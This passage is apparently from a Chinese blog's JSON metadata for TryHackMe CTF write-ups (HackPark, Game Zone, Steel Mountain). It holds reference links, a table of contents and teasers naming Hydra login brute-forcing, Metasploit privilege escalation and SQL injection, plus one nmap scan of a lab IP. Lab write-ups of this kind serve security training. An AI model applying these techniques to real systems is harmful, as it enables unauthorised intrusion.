11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li><a href=\"https://github.com/AonCyberLabs/Windows-Exploit-Suggester\">Windows-Exploit-Suggester</a></li>\n<li><a href=\"https://blog.gdssecurity.com/labs/2014/7/11/introducing-windows-exploit-suggester.html\">Introducing Windows Exploit Suggester</a></li>\n<li><a href=\"https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html\">Project Zero</a></li>\n</ul></blockquote>\n","text":"HarkPark使用Hydra爆破登录网站，搜索漏洞，并利用漏洞升级Windows机器！ 信息收集开启tryhackme靶机，使用Nmap进行服务发现扫描。 └─$ sudo nmap 10.10.1.135 -sS -Pn -F --max-retries 0 -T 4 -oA...","link":"","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"22 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":3,"path":"api/tags/Windows-Privilege-Escalation.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">信息收集</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Hydra%E6%9A%B4%E5%8A%9B%E7%99%BB%E5%BD%95\"><span class=\"toc-text\">Hydra暴力登录</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">漏洞攻击</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#MetaSploit%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">MetaSploit提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%87%E6%8D%A2%E8%87%B3meterpreter%E4%BC%9A%E8%AF%9D\"><span class=\"toc-text\">切换至meterpreter会话</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8F%90%E5%8D%87%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90\"><span class=\"toc-text\">提升系统权限</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">使用工具</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3\"><span class=\"toc-text\">参考文档</span></a></li></ol>","author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Game Zone CTF - TryHackMe.com","uid":"3bda3d0f8b3421f49ec453f4d896421a","slug":"GameZone","date":"2022-04-06T12:43:08.070Z","updated":"2022-04-24T16:58:45.499Z","comments":true,"path":"api/articles/GameZone.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/images.png","text":"Game Zone介绍SQLi(通过 SQLMap 手动利用这个漏洞)、破解用户哈希密码、使用SSH隧道显示隐藏服务以及使用metasploit有效负载获得root特权。 搜集信息按照惯例，使用nmap确认靶机上运行的服务，以此来确认我们接下来的步骤。 nmap 10.10.33...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"10 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"Linux Privilege Escalation","slug":"Linux-Privilege-Escalation","count":3,"path":"api/tags/Linux-Privilege-Escalation.json"},{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"SQLi","slug":"SQLi","count":1,"path":"api/tags/SQLi.json"},{"name":"Reverse SSH tunnel","slug":"Reverse-SSH-tunnel","count":1,"path":"api/tags/Reverse-SSH-tunnel.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Steel Mountain CTF - TryHackMe.com","uid":"11041d9251423dbeb0d78e2c3336a544","slug":"Steel Mountain CTF","date":"2022-03-17T17:29:47.695Z","updated":"2022-03-21T14:03:02.034Z","comments":true,"path":"api/articles/Steel Mountain CTF.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/steel_mountain/index.png","text":" Steel Mountain是TryHackMe的Windows靶机，基于Mr Robot Tv系列。 侦察探测开启TryHackMe靶机后，使用ping命令检测主机是否启动并运行。ping命令执行成功后，使用nmap进行端口扫描。从扫描结果中可以发现，这个靶机运行了SMB服务...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":3,"path":"api/tags/Windows-Privilege-Escalation.json"},{"name":"Steel Mountain","slug":"Steel-Mountain","count":1,"path":"api/tags/Steel-Mountain.json"},{"name":"PowerSploit","slug":"PowerSploit","count":1,"path":"api/tags/PowerSploit.json"},{"name":"winPEAS","slug":"winPEAS","count":1,"path":"api/tags/winPEAS.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}